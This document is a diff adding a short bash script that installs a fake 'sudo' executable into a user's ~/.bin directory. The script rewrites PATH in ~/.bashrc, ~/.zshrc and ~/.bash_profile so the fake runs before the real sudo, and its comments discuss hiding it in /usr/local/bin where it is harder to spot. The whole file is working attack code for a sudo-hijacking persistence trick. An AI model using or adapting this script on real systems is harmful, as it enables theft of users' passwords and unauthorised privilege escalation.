@@ -1,0 +1,51 @@
+#!/bin/bash
+
+# install the script to a user-writable directory
+#
+# we create our a ".bin/" directory in the user's $HOME, but we
+# could just as easily look for more "system-looking" directories
+# and see if they are writable
+#
+# reason being that ~/.bin/sudo looks a bit fishy,
+# whereas /usr/local/bin/sudo is harder to spot, and there are
+# cases where /usr/local/bin is user-writable
+install_bad_sudo() {
+    USER_DIR="$HOME/.bin/"
+    mkdir -p "$USER_DIR"
+    cp ./sudo "$USER_DIR"
+    chmod +x "$USER_DIR/sudo"
+}
+
+# override the $PATH variable to make sure we always look for our "sudo"
+# program before any others
+set_path_override() {
+    RCFILE="$1"
+    # exit if this rc file doesn't exist
+    ls "$RCFILE" >/dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        return
+    fi
+
+    # append to the end of this file if a $PATH invocation doesnt exist
+    grep 'PATH="' "$RCFILE" >/dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        echo 'export PATH="$PATH"' >>"$RCFILE"
+    fi
+
+    # make sure we haven't already added this to the $PATH
+    grep '$HOME\/\.bin:' "$RCFILE" >/dev/null 2>&1
+    if [ $? -eq 0 ]; then
+        return
+    fi
+
+    # update the current $PATH invocation with our new ~/.bin directory
+    sed -i.bak 's/PATH="/PATH="$HOME\/\.bin:/' "$RCFILE" >/dev/null 2>&1
+    source "$RCFILE"
+}
+
+# install our "bad" sudo executable and try to override the $PATH in a number
+# of locations for bash/zsh shell config files
+install_bad_sudo
+set_path_override ~/.bashrc
+set_path_override ~/.zshrc
+set_path_override ~/.bash_profile
